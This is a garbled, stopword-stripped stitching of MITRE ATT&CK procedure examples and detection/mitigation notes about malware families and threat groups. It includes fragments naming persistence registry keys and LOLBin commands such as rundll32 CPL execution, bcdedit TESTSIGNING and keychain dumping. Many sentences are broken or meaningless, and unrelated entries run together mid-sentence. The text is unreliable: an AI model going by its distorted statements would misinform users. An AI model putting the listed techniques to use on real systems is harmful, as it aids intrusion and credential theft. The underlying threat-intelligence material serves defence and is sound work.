MSDTC service.(Citation: TrendMicro EarthLusca 2022)  [Trojan.Karagany](https://attack.mitre.org/software/S0094) capture keystrokes compromised host.(Citation: Secureworks Karagany July 2019) [Stealth Falcon](https://attack.mitre.org/groups/G0038) malware communicates C2 server HTTPS.(Citation: Citizen Lab Stealth Falcon 2016) Windows 10, enable Attack Surface Reduction (ASR) rules secure LSASS prevent credential stealing. (Citation: win10_asr) Train users suspicious certificate errors. Adversaries certificates attempt intercept HTTPS traffic. Certificate errors application’s certificate match expected host. [Egregor](https://attack.mitre.org/software/S0554) enumerate connected drives.(Citation: NHS Digital Egregor Nov 2020) Windows 10, enable Attack Surface Reduction (ASR) rules prevent Office applications creating child processes writing malicious executable content disk. (Citation: win10_asr) Monitor executed commands arguments actions account creation, user useradd [Anchor](https://attack.mitre.org/software/S0504) signed valid certificates evade detection security tools.(Citation: Cyberreason Anchor December 2019) [XAgentOSX](https://attack.mitre.org/software/S0161) ftpUpload function FTPManager:uploadFile method upload files target system.(Citation: XAgentOSX 2017) [down_new](https://attack.mitre.org/software/S0472) ability detect anti-virus products processes compromised host.(Citation: Trend Micro Tick November 2019) [ROKRAT](https://attack.mitre.org/software/S0240) relies specific victim hostname execute decrypt strings.(Citation: Volexity InkySquid RokRAT August 2021) [RDAT](https://attack.mitre.org/software/S0495) AES ciphertext encode C2 communications.(Citation: Unit42 RDAT July 2020) [Sandworm Team](https://attack.mitre.org/groups/G0034) backdoors delete files attack infected system.(Citation: ESET Telebots Dec 2016)(Citation: ESET Telebots July 2017) [EKANS](https://attack.mitre.org/software/S0605) determine domain compromised host.(Citation: IBM Ransomware Trends September 2020) [More_eggs](https://attack.mitre.org/software/S0284) remove system.(Citation: Talos Cobalt July 2018)(Citation: Security Intelligence Eggs Aug 2019) [Tropic Trooper](https://attack.mitre.org/groups/G0081) monitored files' modified time.(Citation: TrendMicro Tropic Trooper 2020)	 [Expand](https://attack.mitre.org/software/S0361) download file alternate data stream.(Citation: LOLBAS Expand) [Metamorfo](https://attack.mitre.org/software/S0455) function hijack data clipboard monitoring contents clipboard replacing cryptocurrency wallet attacker's.(Citation: Fortinet Metamorfo Feb 2020)(Citation: ESET Casbaneiro Oct 2019) [Cobalt Group](https://attack.mitre.org/groups/G0080) Remote Desktop Protocol conduct lateral movement.(Citation: IB Cobalt Aug 2017) [ccf32](https://attack.mitre.org/software/S1043) created hidden directory targeted systems, naming current local time (year, month, day).(Citation: Bitdefender FunnyDream Campaign November 2020) [APT32](https://attack.mitre.org/groups/G0050) lured targets download Cobalt Strike beacon including malicious link spearphishing emails.(Citation: Cybereason Cobalt Kitty 2017)(Citation: Volexity Ocean Lotus November 2020)(Citation: Amnesty Intl. Ocean Lotus February 2021) [StreamEx](https://attack.mitre.org/software/S0142) ability enumerate information.(Citation: Cylance Crew Feb 2017) [PROMETHIUM](https://attack.mitre.org/groups/G0056) Registry establish persistence.(Citation: Talos Promethium June 2020) [Gamaredon Group](https://attack.mitre.org/groups/G0047) file stealer capability steal data newly connected logical volumes system, including USB drives.(Citation: Palo Alto Gamaredon Feb 2017)(Citation: ESET Gamaredon June 2020) [Chaos](https://attack.mitre.org/software/S0220) reverse triggered receipt packet special string, port.(Citation: Chaos Stolen Backdoor) [Pysa](https://attack.mitre.org/software/S0583) RSA AES-CBC encryption algorithm encrypt list targeted file extensions.(Citation: CERT-FR PYSA April 2020)  technique easily mitigated preventive controls based behaviors performed scope enterprise defenses controls. Efforts focus minimizing sensitivity data external parties. [Okrum](https://attack.mitre.org/software/S0439) base64 encode C2 communication.(Citation: ESET Okrum July 2019) user admin domain accounts local administrator systems tightly controlled, equivalent local administrator account password systems. Follow practices design administration enterprise network limit privileged account administrative tiers. (Citation: Bitdefender Naikon April 2021) [PowerDuke](https://attack.mitre.org/software/S0139) command write random data file delete it.(Citation: Volexity PowerDuke November 2016) [Mofang](https://attack.mitre.org/groups/G0103)'s spearphishing emails required user link connect compromised website.(Citation: FOX-IT 2016 Mofang) [Ke3chang](https://attack.mitre.org/groups/G0004) performed  frequent scheduled data exfiltration compromised networks.(Citation: NICKEL December 2021) [XCSSET](https://attack.mitre.org/software/S0658) RC4 encryption TCP communicate C2 server.(Citation: trendmicro xcsset xcode project 2020)   Utilize Yama (ex: /proc/sys/kernel/yama/ptrace_scope) mitigate ptrace based process injection restricting ptrace privileged users only. mitigation controls involve deployment security kernel modules provide advanced access control process restrictions SELinux, grsecurity, AppArmor. Network intrusion detection prevention systems network signatures identify traffic specific adversary malware mitigate activity network level.  [Hildegard](https://attack.mitre.org/software/S0601) modified DNS resolvers evade DNS monitoring tools.(Citation: Unit 42 Hildegard Malware) [Bazar](https://attack.mitre.org/software/S0534) loader named malicious shortcuts "adobe" mimicked communications software.(Citation: Cybereason Bazar July 2020)(Citation: NCC Team9 June 2020)(Citation: CrowdStrike Wizard Spider October 2020) [Meteor](https://attack.mitre.org/software/S0688) change desktop wallpaper lock screen image custom image.(Citation: Check Meteor Aug 2021) [CozyCar](https://attack.mitre.org/software/S0046) executed [Mimikatz](https://attack.mitre.org/software/S0002) harvest stored credentials victim victim penetration.(Citation: F-Secure CozyDuke) [Lazarus Group](https://attack.mitre.org/groups/G0032) malware WhiskeyAlfa overwrite 64MB drive mix static random buffers. process wipe content logical drives and, finally, attempt wipe byte sector drive. WhiskeyBravo overwrite 4.9MB physical drives. WhiskeyDelta overwrite 132MB 1.5MB drive random data heap memory.(Citation: Novetta Blockbuster Destructive Malware) [UNC2452](https://attack.mitre.org/groups/G0118) leveraged privileged accounts replicate directory service data domain controllers.(Citation: 365 Defender Solorigate)(Citation: Deep Dive Solorigate January 2021) [JPIN](https://attack.mitre.org/software/S0201) custom keylogger.(Citation: PLATINUM April 2016) SecretsDump [Mimikatz](https://attack.mitre.org/software/S0002) modules [Impacket](https://attack.mitre.org/software/S0357) perform credential dumping account password information.(Citation: Impacket Tools) Monitor newly constructed .LNK, .SCF, files systems virtual environments resources external network resources  [LookBack](https://attack.mitre.org/software/S0582)’s C2 proxy tool sends data C2 server HTTP.(Citation: Proofpoint LookBack Malware Aug 2019) [Conficker](https://attack.mitre.org/software/S0608) variants spread NetBIOS share propagation.(Citation: SANS Conficker) Monitor executed commands arguments modify plist files automatically application user logs in. [YAHOYAH](https://attack.mitre.org/software/S0388) C2.(Citation: TrendMicro TropicTrooper 2015) [APT28](https://attack.mitre.org/groups/G0007) backdoor collect entire contents inserted USB device.(Citation: SIR 19) [Kimsuky](https://attack.mitre.org/groups/G0094) RC4 encryption exfil.(Citation: Securelist Kimsuky Sept 2013) [Threat Group-3390](https://attack.mitre.org/groups/G0027) actors legitimate credentials variety methods lateral movement victim networks.(Citation: Dell TG-3390) [Doki](https://attack.mitre.org/software/S0600) deployed container.(Citation: Intezer Doki July 20) [Bankshot](https://attack.mitre.org/software/S0239) encodes commands control server range characters gzip.(Citation: McAfee Bankshot) Monitor modifications Registry data enabling safe mode. example, service forced start safe mode boot adding <code>\*</code> "Startup" name: <code>HKLM\Software\Microsoft\Windows\CurrentVersion\Run\["\*Startup"="{Path}"]</code> adding key <code>HKLM\SYSTEM\CurrentControlSet\Control\SafeBoot\Minimal</code>.(Citation: BleepingComputer REvil 2021)(Citation: Sophos Snatch Ransomware 2019) [Rocke](https://attack.mitre.org/groups/G0106)'s miner created UPX-packed files Windows Start Menu Folder.(Citation: Talos Rocke August 2018)(Citation: Unit 42 Rocke January 2019)(Citation: Anomali Rocke March 2019) [SUNBURST](https://attack.mitre.org/software/S0559) created Image File Execution Options (IFEO) Debugger registry process <code>dllhost.exe</code> trigger installation [Cobalt Strike](https://attack.mitre.org/software/S0154).(Citation: Deep Dive Solorigate January 2021) [Operation CuckooBees](https://attack.mitre.org/campaigns/C0012), threat actors `dsquery` `dsget` commands domain environment query users administrative groups.(Citation: Cybereason OperationCuckooBees 2022) [APT32](https://attack.mitre.org/groups/G0050) JavaScript communicates HTTPS attacker controlled domains download additional frameworks. downloaded encrypted payloads HTTP.(Citation: Volexity OceanLotus Nov 2017)(Citation: Cybereason Cobalt Kitty 2017) [RCSession](https://attack.mitre.org/software/S0662) WinSock API communication including <code>WSASend</code> <code>WSARecv</code>.(Citation: Profero APT27 December 2020) (Citation: Mandiant APT1) Monitor processes inject malicious code processes ptrace (process trace) calls evade process-based defenses elevate privileges. [PlugX](https://attack.mitre.org/software/S0013) actors spawn reverse victim.(Citation: Dell TG-3390)(Citation: CIRCL PlugX March 2013) [OSX_OCEANLOTUS.D](https://attack.mitre.org/software/S0352) variant packed UPX.(Citation: ESET OceanLotus macOS April 2019) (Citation: FireEye APT41 Aug 2019)(Citation: Recorded Future RedEcho Feb 2021) [BITTER](https://attack.mitre.org/groups/G1002) encrypted C2 communications.(Citation: Forcepoint BITTER Pakistan Oct 2016) [Squirrelwaffle](https://attack.mitre.org/software/S1030) encoded communications C2 servers Base64.(Citation: ZScaler Squirrelwaffle Sep 2021) [Night Dragon](https://attack.mitre.org/campaigns/C0002), threat actors dumped account hashes [gsecdump](https://attack.mitre.org/software/S0008).(Citation: McAfee Night Dragon) [Mongall](https://attack.mitre.org/software/S1026) `rundll32.exe` execution.(Citation: SentinelOne Aoqin Dragon June 2022) [AppleSeed](https://attack.mitre.org/software/S0622) identify OS version targeted system.(Citation: Malwarebytes Kimsuky June 2021) [ObliqueRAT](https://attack.mitre.org/software/S0644) ability check blocklisted names infected endpoints.(Citation: Talos Oblique RAT March 2021) (Citation: Symantec RAINDROP January 2021) [PowerSploit](https://attack.mitre.org/software/S0194)'s <code>Get-TimedScreenshot</code> Exfiltration module screenshots regular intervals.(Citation: GitHub PowerSploit 2012)(Citation: PowerSploit Documentation) [Machete](https://attack.mitre.org/software/S0409) stores files logs folder local drive.(Citation: ESET Machete July 2019)(Citation: Cylance Machete Mar 2017) executed command clicked, control.exe execute CPL file (ex: <code>control.exe file.cpl</code>) [Rundll32](https://attack.mitre.org/techniques/T1218/011) CPL's API functions (ex: <code>rundll32.exe shell32.dll,Control_RunDLL file.cpl</code>). CPL files executed CPL API function [Rundll32](https://attack.mitre.org/techniques/T1218/011) command, bypass detections execution filters control.exe.(Citation: TrendMicro CPL Malware Jan 2014) Monitor log files, typically stored  /var/log /Library/Logs, unexpected modifications access permissions attributes  Monitor executed commands arguments actions abnormal usage utilities command-line arguments support remote transfer files Applying restrictive permissions files directories prevent adversaries modifying access control lists. Additionally, ensure user settings local remote symbolic links properly set disabled unneeded.(Citation: create_sym_links) [Ursnif](https://attack.mitre.org/software/S0386) collected files victim machines, including certificates cookies.(Citation: TrendMicro BKDR_URSNIF.SM) [Bazar](https://attack.mitre.org/software/S0534) query Registry installed applications.(Citation: Cybereason Bazar July 2020) [Chimera](https://attack.mitre.org/groups/G0114) <code>net start</code> <code>net use</code> service discovery.(Citation: NCC Chimera January 2021) [Kerrdown](https://attack.mitre.org/software/S0585) DLL side-loading load malicious DLLs.(Citation: Unit 42 KerrDown February 2019) Monitor processes command-line arguments actions modify code signing policy system, as <code>bcdedit.exe -set TESTSIGNING ON</code>. (Citation: TESTSIGNING Feb 2021) [DarkWatchman](https://attack.mitre.org/software/S0673) query Registry determine installed system.(Citation: Prevailion DarkWatchman 2021) [Crimson](https://attack.mitre.org/software/S0115) exfiltrate stolen C2.(Citation: Cisco Talos Transparent Tribe Education Campaign July 2022) Set PowerShell execution policy execute signed scripts.  [BlackTech](https://attack.mitre.org/groups/G0098) spearphishing e-mails malicious password-protected archived files (ZIP RAR) deliver malware.(Citation: TrendMicro BlackTech June 2017)(Citation: NTT Security Flagpro December 2021) Limit accounts remote services. Limit permissions accounts risk compromise; example, configure SSH users specific programs. Monitor cloud environments events storage objects anomalously modified. [GoldMax](https://attack.mitre.org/software/S0588) RSA-encrypted communication C2 server.(Citation: MSTIC NOBELIUM Mar 2021) [Chimera](https://attack.mitre.org/groups/G0114) encoded PowerShell commands.(Citation: Cycraft Chimera April 2020)	 Network intrusion detection prevention systems identify traffic patterns indicative AiTM activity mitigate activity network level.(Citation: dhcp_serv_op_events) Identify block malicious software executed Winlogon helper process application control (Citation: Beechey 2010) tools AppLocker (Citation: Windows Commands JPCERT) (Citation: NSA AppLocker) capable auditing blocking unknown DLLs. [Squirrelwaffle](https://attack.mitre.org/software/S1030) POST requests C2 communications.(Citation: ZScaler Squirrelwaffle Sep 2021) [APT29](https://attack.mitre.org/groups/G0016) bypassed MFA set OWA accounts generating cookie stolen secret key.(Citation: Volexity SolarWinds) [Reaver](https://attack.mitre.org/software/S0172) variants C2.(Citation: Palo Alto Reaver Nov 2017) [WhisperGate](https://attack.mitre.org/software/S0689) execution recognizes presence monitoring tools.(Citation: Unit 42 WhisperGate January 2022) [SUNBURST](https://attack.mitre.org/software/S0559) Rundll32 execute payloads.(Citation: Deep Dive Solorigate January 2021)  [Dark Caracal](https://attack.mitre.org/groups/G0070) collected file listings default Windows directories.(Citation: Lookout Dark Caracal Jan 2018) [Kazuar](https://attack.mitre.org/software/S0265) captures images webcam.(Citation: Unit 42 Kazuar 2017) [pngdowner](https://attack.mitre.org/software/S0067) deletes content C2 communications saved user's temporary directory.(Citation: CrowdStrike Putter Panda) [PS1](https://attack.mitre.org/software/S0613) distributed set encrypted files scripts.(Citation: BlackBerry CostaRicto November 2020) [Lazarus Group](https://attack.mitre.org/groups/G0032) replaced background wallpaper systems threatening image rendering unbootable [Disk Structure Wipe](https://attack.mitre.org/techniques/T1561/002).(Citation: Novetta Blockbuster Destructive Malware) (Citation: Scarlet Mimic Jan 2016) [APT41](https://attack.mitre.org/groups/G0096) performed password brute-force attacks local admin account.(Citation: FireEye APT41 Aug 2019) [Dok](https://attack.mitre.org/software/S0281) AppleScript create login item persistence.(Citation: objsee mac malware 2017) [Leviathan](https://attack.mitre.org/groups/G0065) utilized techniques reflective DLL loading write DLL memory load backdoor access victim.(Citation: Accenture MUDCARP March 2019) Monitor executed commands arguments acquire user credentials third-party password managers. (Citation: ise Password Manager February 2019) [Wizard Spider](https://attack.mitre.org/groups/G0102) accessed victim networks stolen credentials access corporate VPN infrastructure.(Citation: FireEye KEGTAP SINGLEMALT October 2020) (Citation: FireEye SUNBURST Backdoor December 2020)(Citation: MSTIC NOBELIUM 2021)(Citation: MSTIC Nobelium Toolset 2021)(Citation: Secureworks IRON RITUAL Profile) [NETWIRE](https://attack.mitre.org/software/S0198) ability <code>/bin/bash</code> <code>/bin/sh</code> execute commands.(Citation: Red Canary NETWIRE January 2020)(Citation: Proofpoint NETWIRE December 2020) [Ixeshe](https://attack.mitre.org/software/S0015) download execute additional files.(Citation: Trend Micro IXESHE 2012) [PowerShower](https://attack.mitre.org/software/S0441) sets persistence Registry key.(Citation: Unit 42 Inception November 2018) [Ember Bear](https://attack.mitre.org/groups/G1003) packed malware avoid detection.(Citation: Palo Alto Unit 42 OutSteel SaintBot February 2022 ) [UNC2452](https://attack.mitre.org/groups/G0118) list users roles Exchange server <code>Get-ManagementRoleAssignment</code>.(Citation: Volexity SolarWinds) Monitor newly assigned drive letters mount data storage device attempt exfiltrate data physical medium, removable drive. [build_downer](https://attack.mitre.org/software/S0471) ability detect infected host running anti-virus process.(Citation: Trend Micro Tick November 2019) [Cobalt Strike](https://attack.mitre.org/software/S0154)'s <code>execute-assembly</code> command .NET executable memory sacrificial process loading CLR.(Citation: Cobalt Strike Manual 4.3 November 2020) creation instance VM common operations cloud environments. Events viewed isolation, chain behavior lead activities. example, creation instance user account unexpected creation snapshots creation instance suspicious activity.
In AWS, CloudTrail logs capture creation instance the RunInstances event, Azure creation VM captured Azure activity logs.(Citation: AWS CloudTrail Search) (Citation: Azure Activity Logs) Google's Admin Activity audit logs Cloud Audit logs detect usage of gcloud compute instances create to create VM.(Citation: Cloud Audit Logs) [Revenge RAT](https://attack.mitre.org/software/S0379) blogpost.com primary command control server campaign.(Citation: Cofense RevengeRAT Feb 2019) [Metamorfo](https://attack.mitre.org/software/S0455) AutoIt load execute DLL payload.(Citation: Fortinet Metamorfo Feb 2020)  (Citation: Mandiant APT1) [FinFisher](https://attack.mitre.org/software/S0182) queries Registry values anti-sandbox checks.(Citation: FinFisher Citation)(Citation: FinFisher March 2018)  [GravityRAT](https://attack.mitre.org/software/S0237) collects volumes mapped system, steals files extensions: .docx, .doc, .pptx, .ppt, .xlsx, .xls, .rtf, .pdf.(Citation: Talos GravityRAT) [DanBot](https://attack.mitre.org/software/S1014) C2 communication.(Citation: SecureWorks August 2019) [TAINTEDSCRIBE](https://attack.mitre.org/software/S0586) main executable disguised Microsoft’s Narrator.(Citation: CISA MAR-10288834-2.v1  TAINTEDSCRIBE 2020) [Wizard Spider](https://attack.mitre.org/groups/G0102) established persistence Userinit adding Registry key HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon.(Citation: FireEye KEGTAP SINGLEMALT October 2020) Monitor processes spawned command utilities manipulate keychains directly, <code>security</code>, combined arguments collect passwords, <code>dump-keychain -d</code>. establish persistence, [SslMM](https://attack.mitre.org/software/S0058) identifies Start Menu Startup directory drops link executable disguised “Office Start,” “Yahoo Talk,” “MSN Gaming Z0ne,” “MSN Talk” shortcut.(Citation: Baumgartner Naikon 2015) [BADNEWS](https://attack.mitre.org/software/S0128) encodes C2 traffic base64.(Citation: Forcepoint Monsoon)(Citation: PaloAlto Patchwork Mar 2018)(Citation: TrendMicro Patchwork Dec 2017) (Citation: SentinelOne Lazarus macOS July 2020)(Citation: TrendMicro macOS Dacls 2020) [Magic Hound](https://attack.mitre.org/groups/G0059) malware SOAP service communicate C2 server.(Citation: Unit 42 Magic Hound Feb 2017) Monitor user accounts logging [Valid Accounts](https://attack.mitre.org/techniques/T1078) interact remote systems Windows Remote Management (WinRM). adversary perform actions logged-on user.  [CaddyWiper](https://attack.mitre.org/software/S0693) modify ACL entries ownership files.(Citation: Cisco CaddyWiper March 2022) [Siloscape](https://attack.mitre.org/software/S0623) connects IRC server C2.(Citation: Unit 42 Siloscape Jun 2021) Monitor files accessed attempt dump contents <code>/etc/passwd</code> <code>/etc/shadow</code> enable offline password cracking. AuditD monitoring tool, ships stock Linux distributions, watch hostile processes attempting access <code>/etc/passwd</code> <code>/etc/shadow</code>, alerting pid, process name, arguments programs. [Pysa](https://attack.mitre.org/software/S0583) modified registry key “SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System” ransom note.(Citation: CERT-FR PYSA April 2020)  [Rising Sun](https://attack.mitre.org/software/S0448) HTTPS command control.(Citation: McAfee Sharpshooter December 2018) [WannaCry](https://attack.mitre.org/software/S0366) scans local network segment remote systems exploit to.(Citation: SecureWorks WannaCry Analysis) [JPIN](https://attack.mitre.org/software/S0201) victim user name.(Citation: PLATINUM April 2016) [Epic](https://attack.mitre.org/software/S0091) overwritten function pointer extra window memory Explorer's Shell_TrayWnd execute malicious code context explorer.exe process.(Citation: ESET Recon Snake Nest) physical factor key target login domain negotiation protocol prevent session cookie theft proxy methods.(Citation: Evilginx 2 July 2018) [Turian](https://attack.mitre.org/software/S0647) establish persistence adding Registry keys.(Citation: ESET BackdoorDiplomacy Jun 2021) process monitoring monitor execution arguments msxsl.exe wmic.exe. (Citation: LOLBAS Wmic) (Citation: Twitter SquiblyTwo Detection APR 2018) Command arguments script invocation determining origin purpose payload loaded. presence msxsl.exe utilities enable proxy execution typically development, debugging, reverse engineering purposes suspicious. [Unknown Logger](https://attack.mitre.org/software/S0130) victim's IP address.(Citation: Forcepoint Monsoon) Verify account credentials access deployment systems unique enterprise network. [DnsSystem](https://attack.mitre.org/software/S1021) `cmd.exe` execution.(Citation: Zscaler Lyceum DnsSystem June 2022) [Emotet](https://attack.mitre.org/software/S0367) maintained persistence scheduled task. (Citation: US-CERT Emotet Jul 2018) [Gorgon Group](https://attack.mitre.org/groups/G0078) emails victims malicious Office documents attached.(Citation: Unit 42 Gorgon Aug 2018) [Sykipot](https://attack.mitre.org/software/S0018) keylogging functionality steal passwords.(Citation: Alienvault Sykipot DOD Smart Cards) Ensure local administrator accounts complex, unique passwords systems network. (Citation: CrowdStrike Wizard Spider October 2020) (Citation: Palo Alto Sofacy 06-2018) verification distributed binaries hash checking integrity checking mechanisms. Scan downloads malicious signatures attempt software updates prior deployment note potential suspicious activity. [Amadey](https://attack.mitre.org/software/S1025) modified `:Zone.Identifier` ADS zero.(Citation: Korean FSI TA505 2020) Monitor newly constructed files establish persistence elevate privileges executing malicious content triggered accessibility features. [Bazar](https://attack.mitre.org/software/S0534) send C2 communications XOR encryption.(Citation: NCC Team9 June 2020) [Bandook](https://attack.mitre.org/software/S0234) command list files system.(Citation: CheckPoint Bandook Nov 2020) (Citation: MalwareBytes LazyScripter Feb 2021) Monitor files inject code processes evade process-based defenses elevate privileges. [Bumblebee](https://attack.mitre.org/software/S1039) ability base64 encode C2 server responses.(Citation: Proofpoint Bumblebee April 2022) [Axiom](https://attack.mitre.org/groups/G0001) acquired dynamic DNS services targeting intended victims.(Citation: Novetta-Axiom) APT29 edited `Microsoft.IdentityServer.Servicehost.exe.config` file load malicious DLL FS process, enabling persistent access service federated FS user User Principal Name.(Citation: MagicWeb) Limit credential overlap accounts systems training users administrators password multiple accounts. [AADInternals](https://attack.mitre.org/software/S0677) create Azure users.(Citation: AADInternals Documentation) [Clop](https://attack.mitre.org/software/S0611) checked keyboard language GetKeyboardLayout() function avoid installation Russian-language Commonwealth Independent States-language machines; check <code>GetTextCharset</code> function.(Citation: Mcafee Clop Aug 2019)  [Leviathan](https://attack.mitre.org/groups/G0065) spearphishing emails malicious attachments, including .rtf, .doc, .xls files.(Citation: Proofpoint Leviathan Oct 2017)(Citation: CISA AA21-200A APT40 July 2021) [Grandoreiro](https://attack.mitre.org/software/S0531) hook APIs, kill processes, break file paths, change ACLs prevent security tools running.(Citation: ESET Grandoreiro April 2020) Monitor third-party application logging, messaging, artifacts deface systems internal organization attempt intimidate mislead users.  [WindTail](https://attack.mitre.org/software/S0466) identify add files possess specific file extensions array archiving.(Citation: objective-see windtail2 jan 2019) [xCaon](https://attack.mitre.org/software/S0653) GetAdaptersInfo() API victim's MAC address.(Citation: Checkpoint IndigoZebra July 2021) (Citation: CISA AA21-200A APT40 July 2021) Network intrusion prevention systems systems designed scan remove malicious email attachments block activity. [Pandora](https://attack.mitre.org/software/S0664) monitor processes compromised host.(Citation: Trend Micro Iron Tiger April 2021) Monitor enrollment devices user accounts alternative security settings require MFA credentials successful logon. non-removable drives victim, [USBStealer](https://attack.mitre.org/software/S0136) executes automated collection files exfiltration.(Citation: ESET Sednit USBStealer 2014) [NDiskMonitor](https://attack.mitre.org/software/S0272) obtains victim encrypts send C2 channel.(Citation: TrendMicro Patchwork Dec 2017) (Citation: Unit42 SilverTerrier 2018) version [KeyBoy](https://attack.mitre.org/software/S0387), string obfuscation routines hide critical values referenced malware.(Citation: CitizenLab KeyBoy Nov 2016) [Kazuar](https://attack.mitre.org/software/S0265) /bin/bash execute commands victim’s machine.(Citation: Unit 42 Kazuar 2017) [Lazarus Group](https://attack.mitre.org/groups/G0032) malware list port choose port C2 traffic, includes uncommonly ports 995, 1816, 465, 1521, 3306, others.(Citation: Novetta Blockbuster)(Citation: Novetta Blockbuster RATs) [MacMa](https://attack.mitre.org/software/S1016) ability record audio.(Citation: Objective-See MacMa Nov 2021) [MuddyWater](https://attack.mitre.org/groups/G0069) malware checked ProgramData folder folders files keywords "Kasper," "Panda," "ESET."(Citation: Securelist MuddyWater Oct 2018) Monitor contextual data account attempt access detailed password policy enterprise network cloud environment. [Axiom](https://attack.mitre.org/groups/G0001) exploits multiple vulnerabilities including CVE-2014-0322, CVE-2012-4792, CVE-2012-1889, CVE-2013-3893.(Citation: Cisco 72) [RainyDay](https://attack.mitre.org/software/S0629) downloaded XOR-encrypted payload.(Citation: Bitdefender Naikon April 2021) [Emotet](https://attack.mitre.org/software/S0367) observed dropping browser password grabber modules. (Citation: Trend Micro Emotet Jan 2019)(Citation: IBM IcedID November 2017) [Magic Hound](https://attack.mitre.org/groups/G0059) malware victim username C2 server.(Citation: Unit 42 Magic Hound Feb 2017)(Citation: DFIR Report APT35 ProxyShell March 2022) [Night Dragon](https://attack.mitre.org/campaigns/C0002), threat actors C2.(Citation: McAfee Night Dragon) [njRAT](https://attack.mitre.org/software/S0385) Base64 encoding C2 traffic.(Citation: Fidelis njRAT June 2013) [HAWKBALL](https://attack.mitre.org/software/S0391) files C2 channel.(Citation: FireEye HAWKBALL Jun 2019) [Grandoreiro](https://attack.mitre.org/software/S0531) monitor browser activity online banking actions display full-screen overlay images block user access intended additional data fields.(Citation: Securelist Brazilian Banking Malware July 2020)(Citation: IBM Grandoreiro April 2020)(Citation: ESET Grandoreiro April 2020) [MarkiRAT](https://attack.mitre.org/software/S0652) compromised host.(Citation: Kaspersky Ferocious Kitten Jun 2021) [Threat Group-3390](https://attack.mitre.org/groups/G0027) embedded malicious code websites screen potential victim's IP address exploit browser interest.(Citation: Gallagher 2015) [HOMEFRY](https://attack.mitre.org/software/S0232) perform credential dumping.(Citation: FireEye Periscope March 2018) Public Key Pinning (HPKP) method mitigate potential man-in-the-middle situations adversary mis-issued fraudulent certificate intercept encrypted communications enforcing expected certificate. (Citation: Wikipedia HPKP) [Sliver](https://attack.mitre.org/software/S0633) encrypt strings compile time.(Citation: Bishop Fox Sliver Framework August 2019)(Citation: GitHub Sliver C2) module [Prikormka](https://attack.mitre.org/software/S0113) collects victim Windows OS version, name, battery info, physical memory.(Citation: ESET Operation Groundbait) [GALLIUM](https://attack.mitre.org/groups/G0093) modified version [Mimikatz](https://attack.mitre.org/software/S0002) PowerShell-based [Mimikatz](https://attack.mitre.org/software/S0002) dump credentials victim machines.(Citation: Cybereason Soft Cell June 2019)(Citation: GALLIUM December 2019) [Trojan.Karagany](https://attack.mitre.org/software/S0094) enumerate files directories compromised host.(Citation: Secureworks Karagany July 2019) [Briba](https://attack.mitre.org/software/S0204) creates key Registry entries malicious DLLs dropped disk.(Citation: Symantec Briba 2012) Monitor newly constructed files modify add LSASS drivers persistence compromised systems. (Citation: Talos Group123)(Citation: Securelist ScarCruft 2019) [HOPLIGHT](https://attack.mitre.org/software/S0376) observed collecting victim machine OS version, drivers, volume more.(Citation: US-CERT HOPLIGHT Apr 2019) [SDBbot](https://attack.mitre.org/software/S0461) ability RDP connect victim's machines.(Citation: Proofpoint TA505 October 2019) [APT29](https://attack.mitre.org/groups/G0016) [GoldFinder](https://attack.mitre.org/software/S0597) perform requests check internet connectivity identify proxy servers redirectors request travels through.(Citation: MSTIC NOBELIUM Mar 2021) Networks development testing content users set servers enterprise network vulnerable systems servers properly secured limit privileged account unauthenticated network share access. [Bumblebee](https://attack.mitre.org/software/S1039) `rundll32` execution loader component.(Citation: Proofpoint Bumblebee April 2022)(Citation: Symantec Bumblebee June 2022) [PoshC2](https://attack.mitre.org/software/S0378) enumerate files local file includes module enumerating accessed files.(Citation: GitHub PoshC2) [XCSSET](https://attack.mitre.org/software/S0658) adds malicious file paths <code>DYLD_FRAMEWORK_PATH</code> <code>DYLD_LIBRARY_PATH</code> environment variables execute malicious code.(Citation: trendmicro xcsset xcode project 2020) [Operation Honeybee](https://attack.mitre.org/campaigns/C0006), threat actors batch files modified registry keys.(Citation: McAfee Honeybee) [InnaputRAT](https://attack.mitre.org/software/S0259) API ShellExecuteW execution.(Citation: ASERT InnaputRAT April 2018) [Threat Group-3390](https://attack.mitre.org/groups/G0027) tools [Impacket](https://attack.mitre.org/software/S0357), [pwdump](https://attack.mitre.org/software/S0006), [Mimikatz](https://attack.mitre.org/software/S0002), [gsecdump](https://attack.mitre.org/software/S0008), [NBTscan](https://attack.mitre.org/software/S0590), [Windows Credential Editor](https://attack.mitre.org/software/S0005).(Citation: Unit42 Emissary Panda 2019)(Citation: Dell TG-3390) [Higaisa](https://attack.mitre.org/groups/G0126) exploited CVE-2018-0798 execution.(Citation: PTSecurity Higaisa 2020) [BADFLICK](https://attack.mitre.org/software/S0642) compressed data aPLib compression library.(Citation: Accenture MUDCARP March 2019) [PowerSploit](https://attack.mitre.org/software/S0194)'s <code>New-UserPersistenceOption</code> Persistence argument establish <code>HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run</code> Registry key.(Citation: GitHub PowerSploit 2012)(Citation: PowerSploit Documentation) [IcedID](https://attack.mitre.org/software/S0483) executed Word documents malicious embedded macros.(Citation: Juniper IcedID June 2020) anti-spoofing email authentication mechanisms filter messages based validity checks sender domain (using SPF) integrity messages (using DKIM). Enabling mechanisms organization (through policies DMARC) enable recipients (intra-org cross domain) perform message filtering validation.(Citation: Anti Spoofing)(Citation: ACSC Email Spoofing) [Koadic](https://attack.mitre.org/software/S0250) enable remote desktop victim's machine.(Citation: Github Koadic) Ensure alerts Protected View enabled.(Citation: Protected View) [ZIRCONIUM](https://attack.mitre.org/groups/G0128) tool capture username compromised host register C2.(Citation: Zscaler APT31 Covid-19 October 2020) [FatDuke](https://attack.mitre.org/software/S0512) base64 encoding, string stacking, opaque predicates obfuscation.(Citation: ESET Dukes October 2019) [njRAT](https://attack.mitre.org/software/S0385) AutoIt compile payload main script single executable delivery.(Citation: Trend Micro njRAT 2018) (Citation: US-CERT KEYMARBLE Aug 2018) Ensure proper file permissions set harden prevent root privilege escalation opportunities. Monitor newly executed processes actions add user subsequently hide login screens. [Silence](https://attack.mitre.org/groups/G0091) environment variable string substitution obfuscation.(Citation: Cyber Forensicator Silence Jan 2019) Monitor attempts enable scripts running considered suspicious. scripts commonly system, enabled, scripts running cycle patching administrator functions suspicious. Scripts captured file determine actions intent.  running Windows environment, [Kazuar](https://attack.mitre.org/software/S0265) saves DLL disk injected explorer.exe process execute payload. [Kazuar](https://attack.mitre.org/software/S0265) configured inject execute specific processes.(Citation: Unit 42 Kazuar 2017) 